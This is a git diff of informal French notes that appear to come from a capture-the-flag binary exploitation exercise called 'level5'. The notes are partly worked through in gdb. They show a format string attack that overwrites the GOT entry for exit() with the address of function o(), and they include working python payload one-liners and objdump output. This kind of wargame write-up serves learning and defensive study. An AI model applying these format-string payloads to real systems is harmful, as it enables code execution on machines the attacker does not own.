@@ -1,30 +1,19 @@
-in printf eip is at 0xbffff4fc
-function o is at 0x080484a4
-let's put this adress in EIP
+# level5
 
+In printf `eip` is at `0xbffff4fc`
+Function `o()` is at `0x080484a4`
+Let's put this adress in `EIP`!
 
+```bash
 python -c "print '\xfc\xf4\xff\xbf' + '%134513824x' + '%4\$n'")
+```
 
-ne marche pas avec 24, 25, 26 plante au milieu de la fonction (<o+2>)
+Ne marche pas avec 24, 25, 26 plante au milieu de la fonction `(<o+2>)`
 
-j'arrive pas à lancer function o()
+On arrive pas à lancer function `o()` \
+`eip` dans `printf` change de temps en temps ---> **le seum**
 
-donc j'essaye au milieu de la fonction
-addresse 0x080484b1
-
-(gdb) print 0x080484aa
-$2 = 134513834
-
-(gdb) set args <<<$(python -c "print '\xfc\xf4\xff\xbf' + '%134513830x' + '' + '%4\$n'")
-
-
-ça fonctionne pas, eip dans printf change de temps en temps ---> le seum
-
-
-on peut reecrire GOT ( global offset table) on reecrie exit()
-
-on choppe l'adresse de exit dans la GOT et on y ecris l'adresse o()
-
+Sauf que!! On peut réecrire le GOT (Global Offset Table): on réecrie l'adresse de `exit()` et on y met l'adresse de `o()`:
 ```
 (gdb) info function exit
 # 0x080483d0  exit
@@ -37,7 +26,7 @@ disas 0x080483d0
 # End of assembler dump.
 ```
 
-// Deuxième manière d'avoir le GOT:
+=> Deuxième manière d'avoir le GOT:
 ```
 objdump -R ./level5
 
@@ -56,4 +45,7 @@ OFFSET   TYPE              VALUE
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
 
+On a notre payload:
+```bash
 (python -c "print '\x38\x98\x04\x08' + '%134513824x' + '' + '%4\$n'"; cat) | ./level5
+```
